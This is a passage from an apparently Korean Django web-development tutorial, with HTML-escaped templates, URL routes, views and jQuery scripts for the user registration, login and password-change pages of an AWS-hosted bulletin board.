href=\u0026#34;#\u0026#34;\u0026gt;공지사항\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;col-2 center sideline dark-link\u0026#34;\u0026gt;\r\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;자유 게시판\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;col-2 center sideline dark-link\u0026#34;\u0026gt;\r\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;대화형 게시판\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;col-2 center sideline\u0026#34;\u0026gt;\u0026amp;nbsp;\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div id=\u0026#34;container\u0026#34;\u0026gt;\r{% block content %}{% endblock %}\r\u0026lt;/div\u0026gt;\r\u0026lt;div id=\u0026#34;footer\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;row bg-dark\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12 center\u0026#34; style=\u0026#34;color:white\u0026#34;\u0026gt;Copyright by Digitalbooks / \u0026lt;a href=\u0026#34;mailto:mail\u0026#34;\u0026gt;Contact Us\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rurls.py에 등록되지 않은 url은 \u0026lsquo;#\u0026lsquo;으로 변경\nurl을 추가할 때 마다 원래의 base.html을 업데이트 해 준다\n  main page\n vi boardapp/urls.py\rfrom django.conf.urls.static import static\rfrom django.conf import settings\rfrom django.urls import path\rfrom django.contrib.auth import views as auth_views\rfrom boardapp.views import *\rurlpatterns = [\rpath(\u0026#39;\u0026#39;, main_page, name=\u0026#39;main\u0026#39;),\r]\rurlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)\rvi boardapp/view.py\rfrom django.shortcuts import render, redirect\rfrom django.http import HttpResponse, HttpResponseRedirect, JsonResponse\rfrom boardapp.models import *\rfrom datetime import datetime\rfrom django.utils import timezone\rimport math\rfrom django.db.models import Count\rfrom django.core.paginator import Paginator\rfrom django.contrib.auth.decorators import login_required\rfrom django.views.generic import DetailView\rdef main_page(request):\rreturn render(request, \u0026#39;main.html\u0026#39;)\rvi boardapp/templates/main.html\r{% extends \u0026#34;base.html\u0026#34; %}\r{% block title %} Main {% endblock %}\r{% block script %}\r{% endblock %}\r{% block content %}\r\u0026lt;div class=\u0026#34;row block-center\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt;\r\u0026lt;h1\u0026gt;Welcome to AWS Django Board!\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r{% endblock %}\r boardapp/urls.py  # urlpatterns에 추가한다.\r path(\u0026#39;login/\u0026#39;, auth_views.LoginView.as_view(template_name=\u0026#39;login.html\u0026#39;), name=\u0026#39;login\u0026#39;),\rpath(\u0026#39;logout/\u0026#39;, auth_views.LogoutView.as_view(), name=\u0026#39;logout\u0026#39;),\rpath(\u0026#39;password_change/\u0026#39;, auth_views.PasswordChangeView.as_view(template_name=\u0026#39;password_change.html\u0026#39;), name=\u0026#39;password_change\u0026#39;),\rpath(\u0026#39;password_change_done/\u0026#39;, auth_views.PasswordChangeDoneView.as_view(template_name=\u0026#39;password_change_done.html\u0026#39;), name=\u0026#39;password_change_done\u0026#39;),\rpath(\u0026#39;user_register/\u0026#39;, user_register_page, name=\u0026#39;register\u0026#39;),\rpath(\u0026#39;user_register_idcheck/\u0026#39;, user_register_idcheck, name=\u0026#39;registeridcheck\u0026#39;),\rpath(\u0026#39;user_register_res/\u0026#39;, user_register_result, name=\u0026#39;registerres\u0026#39;),\rpath(\u0026#39;user_register_completed/\u0026#39;, user_register_completed, name=\u0026#39;registercompleted\u0026#39;),\ruser_register  boardapp/views.py  {% extends \u0026#34;base.html\u0026#34; %}\r{% block title %}회원가입{% endblock %}\r{% block script %}\r{% load static %}\u0026lt;script src=\u0026#34;{% static \u0026#39;boardapp/assets/js/user.js\u0026#39; %}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r{% endblock %}\r{% block content %}\r\u0026lt;div class=\u0026#34;row block-center\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;card-box col-6\u0026#34;\u0026gt;\r\u0026lt;form id=\u0026#34;register_form\u0026#34; action=\u0026#34;/boardapp/user_register_res/\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\r{% csrf_token %}\r\u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;phone\u0026#34; id=\u0026#34;phone\u0026#34; value=\u0026#34;\u0026#34;/\u0026gt;\r\u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; id=\u0026#34;email\u0026#34; value=\u0026#34;\u0026#34;/\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12\u0026#34;\u0026gt;\u0026lt;h2\u0026gt;회원가입\u0026lt;/h2\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\rID:\r\u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt;\r\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;중복확인\u0026#34; onclick=\u0026#34;idCheck()\u0026#34;/\u0026gt;\r\u0026lt;span id=\u0026#34;idcheck-result\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\r\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\rPassword:\r\u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt;\r\u0026lt;/span\u0026gt;\r\u0026lt;br/\u0026gt;\r\u0026lt;span style=\u0026#34;font-size: 0.7em\u0026#34;\u0026gt;\r* 비밀번호는 8글자 이상 입력해 주셔야 합니다.\r\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\rPassword 확인:\r\u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;password_check\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt;\r\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\r이름:\r\u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;test\u0026#34; name=\u0026#34;last_name\u0026#34; id=\u0026#34;last_name\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt;\r\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\rE-mail:\r\u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;test\u0026#34; name=\u0026#34;email_id\u0026#34; id=\u0026#34;email_id\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt;\r@ \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;email_domain\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;8\u0026#34;/\u0026gt;\r\u0026lt;select id=\u0026#34;email_selection\u0026#34; onchange=\u0026#34;changeEmailDomain()\u0026#34;\u0026gt;\r\u0026lt;option value=\u0026#34;\u0026#34; selected=\u0026#34;selected\u0026#34;\u0026gt;--선택하세요--\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;naver.com\u0026#34;\u0026gt;naver.com\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;hanmail.net\u0026#34;\u0026gt;hanmail.net\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;gmail.com\u0026#34;\u0026gt;gmail.com\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;me.com\u0026#34;\u0026gt;me.com\u0026lt;/option\u0026gt;\r\u0026lt;/select\u0026gt;\r\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\r전화번호:\r\u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;phone1\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;3\u0026#34;/\u0026gt; - \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;phone2\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;4\u0026#34;/\u0026gt; - \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;phone3\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;4\u0026#34;/\u0026gt;\r\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\r생년월일:\r\u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;test\u0026#34; name=\u0026#34;birth_year\u0026#34; id=\u0026#34;birth_year\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;4\u0026#34;/\u0026gt; 년\r\u0026lt;select name=\u0026#34;birth_month\u0026#34; id=\u0026#34;birth_month\u0026#34;\u0026gt;\r\u0026lt;option value=\u0026#34;1\u0026#34;\u0026gt;1\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;2\u0026#34;\u0026gt;2\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;3\u0026#34;\u0026gt;3\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;4\u0026#34;\u0026gt;4\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;5\u0026#34;\u0026gt;5\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;6\u0026#34;\u0026gt;6\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;7\u0026#34;\u0026gt;7\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;8\u0026#34;\u0026gt;8\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;9\u0026#34;\u0026gt;9\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;10\u0026#34;\u0026gt;10\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;11\u0026#34;\u0026gt;11\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026#34;12\u0026#34;\u0026gt;12\u0026lt;/option\u0026gt;\r\u0026lt;/select\u0026gt; 월\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;birth_day\u0026#34; id=\u0026#34;birth_day\u0026#34; value=\u0026#34;\u0026#34; size=\u0026#34;2\u0026#34;/\u0026gt; 일\r\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;회원가입\u0026#34; onclick=\u0026#34;userRegister()\u0026#34;/\u0026gt;\r\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;취소\u0026#34; onclick=\u0026#34;cancelUserRegister()\u0026#34;/\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r{% endblock %}\r vi/boardapp/static/boardapp/assets/js/user.js  function idCheck() {\rif (!$(\u0026#39;#username\u0026#39;).val()) {\ralert(\u0026#34;ID를 입력해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\r$.ajax({\rtype: \u0026#34;POST\u0026#34;,\rurl: \u0026#34;/boardapp/user_register_idcheck/\u0026#34;,\rdata: {\r\u0026#39;username\u0026#39;: $(\u0026#39;#username\u0026#39;).val(),\r\u0026#39;csrfmiddlewaretoken\u0026#39;: $(\u0026#34;input[name=csrfmiddlewaretoken]\u0026#34;).val()\r},\rsuccess: function(response) {\r$(\u0026#39;#idcheck-result\u0026#39;).html(response);\r},\r});\r}\rfunction changeEmailDomain() {\r$(\u0026#39;#email_domain\u0026#39;).val($(\u0026#39;#email_selection\u0026#39;).val());\r}\rfunction cancelUserRegister() {\rvar result = confirm(\u0026#34;회원가입을 취소하시겠습니까?\u0026#34;);\rif (result) {\r$(location).attr(\u0026#39;href\u0026#39;, \u0026#39;/boardapp/login\u0026#39;);\r}\r}\rfunction userRegister() {\rif (!$(\u0026#39;#username\u0026#39;).val()) {\ralert(\u0026#34;아이디를 입력해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\rif (!$(\u0026#39;#IDCheckResult\u0026#39;).val()) {\ralert(\u0026#34;ID 중복체크를 먼저 진행해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\rif (!$(\u0026#39;#password\u0026#39;).val()) {\ralert(\u0026#34;비밀번호를 입력해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\rif ($(\u0026#39;#password\u0026#39;).val() != $(\u0026#39;#password_check\u0026#39;).val()) {\ralert(\u0026#34;비밀번호가 일치하지 않습니다.\u0026#34;);\rreturn;\r}\rif (!$(\u0026#39;#last_name\u0026#39;).val()) {\ralert(\u0026#34;이름을 입력해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\rif (!$(\u0026#39;#phone1\u0026#39;).val() || !$(\u0026#39;#phone2\u0026#39;).val() || !$(\u0026#39;#phone3\u0026#39;).val()) {\ralert(\u0026#34;전화번호를 올바르게 입력해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\rif (!$(\u0026#39;#email_id\u0026#39;).val() || !$(\u0026#39;#email_domain\u0026#39;).val()) {\ralert(\u0026#34;E-mail 주소를 올바르게 입력해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\rif (!$(\u0026#39;#birth_year\u0026#39;).val() || !$(\u0026#39;#birth_month\u0026#39;).val() || !$(\u0026#39;#birth_day\u0026#39;).val()) {\ralert(\u0026#34;생년월일을 올바르게 입력해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\r$(\u0026#39;#phone\u0026#39;).val($(\u0026#39;#phone1\u0026#39;).val() + \u0026#34;-\u0026#34; + $(\u0026#39;#phone2\u0026#39;).val() + \u0026#34;-\u0026#34; + $(\u0026#39;#phone3\u0026#39;).val());\r$(\u0026#39;#email\u0026#39;).val($(\u0026#39;#email_id\u0026#39;).val() + \u0026#34;@\u0026#34; + $(\u0026#39;#email_domain\u0026#39;).val());\r$(\u0026#39;#register_form\u0026#39;).submit();\r}\ruser_register_idcheck  vi/boardapp/views.py  def user_register_idcheck(request):\rif request.method == \u0026#34;POST\u0026#34;:\rusername = request.POST[\u0026#39;username\u0026#39;]\relse:\rusername = \u0026#39;\u0026#39;\ridObject = User.objects.filter(username__exact=username)\ridCount = idObject.count()\rif idCount \u0026gt; 0:\rmsg = \u0026#34;\u0026lt;font color=\u0026#39;red\u0026#39;\u0026gt;이미 존재하는 ID입니다.\u0026lt;/font\u0026gt;\u0026lt;input type=\u0026#39;hidden\u0026#39; name=\u0026#39;IDCheckResult\u0026#39; id=\u0026#39;IDCheckResult\u0026#39; value=0/\u0026gt;\u0026#34;\relse:\rmsg = \u0026#34;\u0026lt;font color=\u0026#39;blue\u0026#39;\u0026gt;사용할 수 있는 ID입니다.\u0026lt;/font\u0026gt;\u0026lt;input type=\u0026#39;hidden\u0026#39; name=\u0026#39;IDCheckResult\u0026#39; id=\u0026#39;IDCheckResult\u0026#39; value=1/\u0026gt;\u0026#34;\rreturn HttpResponse(msg)\ruser_register_res  boardapp/view.py  def user_register_result(request):\rif request.method == \u0026#34;POST\u0026#34;:\rusername = request.POST[\u0026#39;username\u0026#39;]\rpassword = request.POST[\u0026#39;password\u0026#39;]\rlast_name = request.POST[\u0026#39;last_name\u0026#39;]\rphone = request.POST[\u0026#39;phone\u0026#39;]\remail = request.POST[\u0026#39;email\u0026#39;]\rbirth_year = request.POST[\u0026#39;birth_year\u0026#39;]\rbirth_month = request.POST[\u0026#39;birth_month\u0026#39;]\rbirth_day = request.POST[\u0026#39;birth_day\u0026#39;]\rtry:\rif username and User.objects.filter(username__exact=username).count() == 0:\rdate_of_birth = datetime(int(birth_year), int(birth_month), int(birth_day))\ruser = User.objects.create_user(username, password, last_name, email, phone, date_of_birth)\rredirection_page = \u0026#39;/boardapp/user_register_completed/\u0026#39;\relse:\rredirection_page = \u0026#39;/boardapp/error/\u0026#39;\rexcept BaseException as e:\rprint(e)\rredirection_page = \u0026#39;/boardapp/error/\u0026#39;\rreturn redirect(redirection_page)\ruser_register_complete  vi boardapp/views.py  def user_register_completed(request):\rreturn render(request, \u0026#39;user_register_completed_page.html\u0026#39;)\r vi boardapp/templates/user_register_completed_page.html  {% extends \u0026#34;base.html\u0026#34; %}\r{% block title %}회원가입 완료{% endblock %}\r{% block script %}\r{% endblock %}\r{% block content %}\r\u0026lt;div style=\u0026#34;height: 70px;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row block-center\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;card-box col-8\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12\u0026#34;\u0026gt;\r\u0026lt;h3 class=\u0026#34;margin-bottom-10\u0026#34;\u0026gt;\r회원가입이 완료되었습니다.\r\u0026lt;/h3\u0026gt;\r\u0026lt;h3 class=\u0026#34;margin-bottom-10\u0026#34;\u0026gt;\rAWS / Django Web Application의 서비스를 이용할 수 있습니다.\r\u0026lt;/h3\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;로그인\u0026#34; onclick=\u0026#34;location.href=\u0026#39;{% url \u0026#39;login\u0026#39; %}\u0026#39;\u0026#34; /\u0026gt;\r\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;메인화면\u0026#34; onclick=\u0026#34;location.href=\u0026#39;{% url \u0026#39;main\u0026#39; %}\u0026#39;\u0026#34; /\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r{% endblock %}\rlogin  vi /boardapp/templates/login.html  {% extends \u0026#34;base.html\u0026#34; %}\r{% block title %}Login{% endblock %}\r{% block script %}\r{% load static %}\u0026lt;script src=\u0026#34;{% static \u0026#39;boardapp/assets/js/login.js\u0026#39; %}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r{% endblock %}\r{% block content %}\r{% if form.errors %}\r\u0026lt;script\u0026gt;alert(\u0026#34;ID와 비밀번호를 올바르게 입력하십시오\u0026#34;);\u0026lt;/script\u0026gt;\r{% endif %}\r\u0026lt;div style=\u0026#34;height: 70px;\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row block-center\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;card-box col-12\u0026#34;\u0026gt;\r\u0026lt;form id=\u0026#34;login_form\u0026#34; action=\u0026#34;.\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\r{% csrf_token %}\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt;\u0026lt;h2\u0026gt;Login\u0026lt;/h2\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-6 right\u0026#34;\u0026gt;ID\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-5\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34; size=\u0026#34;12\u0026#34;/\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class = \u0026#34;row\u0026#34;\u0026gt;\r \u0026lt;div class=\u0026#34;col-6 right\u0026#34;\u0026gt;PASSWORD\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-5\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; size=\u0026#34;12\u0026#34;/\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;로그인\u0026#34; onclick=\u0026#34;login()\u0026#34;/\u0026gt;\r\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;회원가입\u0026#34; onclick=\u0026#34;location.href=\u0026#39;{% url \u0026#39;register\u0026#39; %}\u0026#39;\u0026#34;/\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt;\r\u0026lt;h4\u0026gt;아이디가 없으십니까? 회원가입을 해 주시기 바랍니다!\u0026lt;/h4\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r{% endblock %}\r vi boardapp/static/boardapp/assets/js/login.js  $(document).ready(function() {\r$(\u0026#39;input\u0026#39;).keydown(function(e) {\rif (e.which == 13) {\r$(\u0026#39;form\u0026#39;).submit();\r}\r});\r});\rfunction login() {\rif (!$(\u0026#39;#username\u0026#39;).val()) {\ralert(\u0026#34;아이디를 입력해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\rif (!$(\u0026#39;#password\u0026#39;).val()) {\ralert(\u0026#34;비밀번호를 입력해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\r$(\u0026#39;#login_form\u0026#39;).submit();\r}\rlogoute  LogoutView  LogoutView는 django에서 지원하는 auth의 views를 사용한다. template는 따로 지정하지 않았다.    modify  PasswordChangeView  PasswordChangeView는 django에서 지원하는 auth의 views를 사용한다. urls.py에서 template_name을 password_change.html로 지정하였다.   vi boardapp/templates/password_change.html  {% extends \u0026#34;base.html\u0026#34; %}\r{% block title %}회원정보 조회{% endblock %}\r{% block script %}\r{% load static %}\u0026lt;script src=\u0026#34;{% static \u0026#39;boardapp/assets/js/user.js\u0026#39; %}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r{% endblock %}\r{% block content %}\r{% if form.errors %}\r\u0026lt;script\u0026gt;alert(\u0026#34;비밀번호 변경이 잘못되었습니다. 올바르게 입력해 주시기 바랍니다.\u0026#34;)\u0026lt;/script\u0026gt;\r{% endif %}\r\u0026lt;div class=\u0026#34;row block-center\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;card-box col-6\u0026#34;\u0026gt;\r\u0026lt;form id=\u0026#34;password_change_form\u0026#34; action=\u0026#34;.\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\r{% csrf_token %}\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12\u0026#34;\u0026gt;\u0026lt;h2\u0026gt;회원정보 조회 / 비밀번호 변경\u0026lt;/h2\u0026gt;\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\rID: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ user.username }}\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\r{{ form.old_password.label_tag }}\r\u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ form.old_password }}\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\r{{ form.new_password1.label_tag }}\r\u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ form.new_password1 }}\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\r{{ form.new_password2.label_tag }}\r\u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ form.new_password2 }}\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\r이름: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ user.last_name }}\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\rE-mail: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ user.email }}\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\r전화번호: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ user.phone }}\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;ml-1 col-11\u0026#34;\u0026gt;\r생년월일: \u0026lt;span class=\u0026#34;margin-left-10\u0026#34;\u0026gt;{{ user.date_of_birth | date:\u0026#34;Y년 n월 j일\u0026#34; }}\u0026lt;/span\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-12 center\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;비밀번호 변경\u0026#34; onclick=\u0026#34;changePassword()\u0026#34;/\u0026gt;\r\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;이전화면\u0026#34; onclick=\u0026#34;window.history.back()\u0026#34;/\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r{% endblock %}\r vi boardapp/static/boardapp/assets/js/user.js  function changePassword() {\rif (!$(\u0026#39;#id_old_password\u0026#39;).val()) {\ralert(\u0026#34;비밀번호를 입력해 주시기 바랍니다.\u0026#34;);\rreturn;\r}\rif ($(\u0026#39;#id_new_password1\u0026#39;).val() != $(\u0026#39;#id_new_password2\u0026#39;).val()) {\ralert(\u0026#34;비밀번호가 일치하지 않습니다.\u0026#34;);\rreturn;\r}\r$(\u0026#39;#password_change_form\u0026#39;).submit();\r}\rPasswordChangeDoneView  PasswordChangeDoneView는 django에서 